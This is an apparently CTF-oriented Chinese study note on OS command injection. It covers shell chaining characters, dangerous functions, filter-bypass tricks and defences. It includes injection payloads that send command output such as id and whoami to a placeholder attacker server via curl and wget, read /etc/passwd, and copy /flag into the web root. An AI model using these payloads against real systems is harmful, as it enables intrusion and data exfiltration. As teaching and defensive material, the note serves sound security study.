# 命令执行 · 原理笔记

> Payload 见 [payload.md](payload.md) ｜ 做题记录见 [做过的题.md](做过的题.md)

## 一句话本质

**用户输入被拼进系统命令并交给了 shell**，shell 的元字符（`;` `|` `&&` `` ` `` `$()`）让攻击者能追加自己的命令。与代码执行的区别：命令执行的边界是 shell，代码执行的边界是语言解释器。

## 两条常见路径

| 路径 | 说明 | 关键词 |
| --- | --- | --- |
| 直接拼接系统命令 | `system("ping " + ip)` | PHP `system`/`exec`/`shell_exec`/`passthru`/`popen`/`proc_open`/反引号；Python `os.system`/`subprocess`；Java `Runtime.exec`；Node `child_process` |
| 代码执行 | 输入被当代码跑 | PHP `eval`/`assert`/`create_function`/`preg_replace(/e)`/`call_user_func`；Python `eval`/`exec`/`pickle`；JS `eval`/`Function` |

**反序列化、SSTI、文件包含、模板注入最终多数落到这两条路径上。**

## 命令拼接符（先确定 shell 类型）

| 符号 | 行为 | 适用 |
| --- | --- | --- |
| `;` | 顺序执行，前面的失败也继续 | Linux |
| `\|` | 管道，把前者输出给后者 | 都行 |
| `\|\|` | 前面失败才执行后面 | 都行 |
| `&&` | 前面成功才执行后面 | 都行 |
| `` `cmd` `` | 命令替换 | Linux |
| `$(cmd)` | 命令替换（更好用，可嵌套） | Linux |
| `&` | 后台执行 | 都行 |
| `%0a` | 换行符，等于新命令 | 都行 |
| `\n` | 换行（URL 编码后同上） | 都行 |

**Windows 下**：`&` 顺序执行、`|` 管道、`&&` 逻辑与、`||` 逻辑或。

## 判断是否真有回显

| 现象 | 结论 |
| --- | --- |
| 命令输出直接出现在页面 | 完全回显，最省事 |
| 没有回显但能写文件 | 写 webshell / 写文件再读 |
| 全无回显 | 时间盲（`sleep 5` / `ping -n 6 127.0.0.1`）、外带（curl/wget 到自己的服务器） |

## 绕过过滤（这是本考点 80% 的功夫）

| 被过滤 | 绕过 |
| --- | --- |
| 空格 | `${IFS}`、`$IFS$9`、`%09`、`<`、`>`、`{cat,/etc/passwd}` |
| 关键字 `cat` | `tac`、`nl`、`more`、`less`、`head`、`tail`、`sort`、`rev`、`od`、`strings`、`/bin/cat` |
| 关键字 `flag` | `f*`、`f????`、`[f]lag`、`fl''ag`、`fl\ag`、`$(echo ZmxhZw==\|base64 -d)` |
| 引号被过滤 | 用 `$'\x66\x6c\x61\x67'`、`$(printf '\146\154\141\147')` |
| 关键字 `ls` | `dir`、`echo *`、`find .` |
| 斜杠被过滤 | `${PATH:0:1}`、`$(printf '\57')` |
| 命令分隔符被过滤 | 换行 `%0a`、`%0d`、用 `$()` 嵌套 |
| 长度限制 | 分多次写文件再拼接执行；或 `echo 内容 > a.php` 分步 |
| WAF 拦 `system` 等函数 | 用等价的 `popen`/`proc_open`/反引号/`mail()`/`putenv`+`assert` |
| 只能执行部分字符 | 用 `>` 逐字符写脚本再 `sh` |

## 无回显的确认与利用

```bash
# 时间盲：确认命令真的执行了
; sleep 5
; ping -c 5 127.0.0.1        # Linux
& ping -n 6 127.0.0.1        # Windows

# 外带：把自己的输出带出来
; curl http://<你的服务器>/?d=$(id | base64 | tr -d '\n')
; wget -q -O- http://<你的服务器>/$(whoami)

# 写文件再读
; id > /var/www/html/o.txt
; cp /flag /var/www/html/flag.txt
```

## 防御

| 做法 | 说明 |
| --- | --- |
| 不调用 shell | 用参数化 API：PHP `proc_open` 传数组、Python `subprocess.run([...])` 不开 `shell=True` |
| 白名单校验参数 | 例如 IP 参数必须匹配 `\d+\.\d+\.\d+\.\d+` |
| 转义 | `escapeshellarg()` / `escapeshellcmd()`（注意顺序与场景） |
| 禁用危险函数 | `disable_functions`（可被绕过的场景很多，不是治本） |
| 最小权限 + 容器隔离 | 即使被打穿，影响可控 |
| 命令审计/日志 | 便于发现与追溯 |
